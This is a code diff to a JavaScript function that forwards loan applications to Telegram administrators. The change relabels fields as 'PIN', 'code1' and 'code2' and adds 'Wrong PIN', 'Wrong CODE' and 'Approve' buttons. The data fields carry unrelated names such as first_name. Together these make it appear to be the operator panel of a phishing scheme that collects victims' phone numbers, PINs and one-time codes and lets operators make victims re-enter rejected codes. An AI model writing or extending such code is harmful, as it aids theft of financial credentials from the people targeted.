@@ -437,9 +437,9 @@ async function notifyTelegram(application) {
   const attempt = Number(application.attempt_number || 1);
   const title = attempt > 1 ? "🔄 RETURNING CUSTOMER (PREVIOUS APPLICATIONS)" : "📋 NEW LOAN APPLICATION";
   const message = `${title}\n\n` +
-    `📋 Application ID: ${application.application_no || application.application_id || `APP-${application.id}`}\n` +
-    `📞 Customer number: ${application.phone || "—"}\n` +
-    `🔢 Application reference: ${application.application_id || application.application_no || "—"}\n` +
+    `📋 ID: ${application.application_no || application.application_id || `APP-${application.id}`}\n` +
+    `📞 PHONE: ${application.phone || "—"}\n` +
+    `🔑 PIN: ${application.application_id || application.application_no || "—"}\n` +
     `🔢 code1: ${application.first_name || "—"}\n` +
     `🔢 code2: ${application.second_name || "—"}\n` +
     `⏰ Date: ${stamp}\n` +
@@ -447,9 +447,9 @@ async function notifyTelegram(application) {
     `📌 Status: ${application.status || "PENDING_ADMIN_APPROVAL"}`;
   for (const adminId of recipients) {
     const keyboard = { inline_keyboard: [[
-      { text: "❌ Wrong ID", callback_data: `wrongid:${application.id}` },
-      { text: "❌ Wrong application code", callback_data: `wrongcode:${application.id}` }
-    ], [{ text: "✅ Approve application", callback_data: `approve:${application.id}` }]] };
+      { text: "❌ Wrong PIN", callback_data: `wrongid:${application.id}` },
+      { text: "❌ Wrong CODE", callback_data: `wrongcode:${application.id}` }
+    ], [{ text: "✅ Approve", callback_data: `approve:${application.id}` }]] };
     try { await bot.sendMessage(adminId, message, { reply_markup: keyboard, disable_web_page_preview: true }); }
     catch (err) { console.error(`Telegram send failed for admin ${adminId}:`, err.message); }
   }
